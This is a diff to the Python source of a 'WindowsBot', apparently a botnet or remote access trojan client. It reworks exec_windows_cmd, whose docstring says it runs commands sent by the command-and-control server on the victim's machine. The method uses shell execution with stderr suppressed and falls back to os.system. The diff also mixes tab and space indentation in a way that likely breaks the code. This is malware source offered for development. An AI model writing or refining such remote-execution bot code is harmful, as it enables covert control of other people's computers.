@@ -292,30 +292,29 @@ class WindowsBot:
 		pass
 
 	def exec_windows_cmd(self, command: str):
-		"""This function will execute Windows commands requested by the C&C.
-			Argments:
-				command (str): The command that will be executed on the victim's machine.
-			Returns:
-				Will return the output of the command that was executed.
-		"""
-
-		DEVNULL = open(os.devnull, 'w') # Open devnull file to send stderr to.
-		try:
-			# os.popen('cat /etc/services').read()
-			output = run(command, # Run command.
-						shell=True, # Perform this command in cmd.exe.
-						stdout=PIPE, # Pipe command to store in variable.
-						stderr=DEVNULL)	# Send standard error to devnull.
-			return output.stdout # Return the stdout property of this subprocess object.
-		except:
-			try:
-				os.chdir(command[3:]) # Attempt to change directory.
-				return "Ok" # Returns Ok if changing of directory was successsful.
-			except:
-				try:
-					os.system(command) # Try executing command with OS module.
-				except:
-					return "[-] Invalid command." # Return this error message if unsuccessful.
+        """This function will execute Windows commands requested by the C&C.
+            Argments:
+                command (str): The command that will be executed on the victim's machine.
+            Returns:
+                Will return the output of the command that was executed.
+        """
+        DEVNULL = open(os.devnull, 'w') # Open devnull file to send stderr to.
+        try:
+            os.chdir(command[3:]) # Attempt to change directory.
+            return "Ok" # Returns Ok if changing of directory was successsful.
+        except:
+            try:
+                # os.popen('cat /etc/services').read()
+                output = run(command, # Run command.
+                            shell=True, # Perform this command in cmd.exe.
+                            stdout=PIPE, # Pipe command to store in variable.
+                            stderr=DEVNULL) # Send standard error to devnull.
+                return output.stdout # Return the stdout property of this subprocess object.
+            except:
+                try:
+                    os.system(command) # Try executing command with OS module.
+                except:
+                    return "[-] Invalid command." # Return this error message if unsuccessful.
 
 	def handle_request(self):
 		"""This function will handle all tasks related to request made by the server.
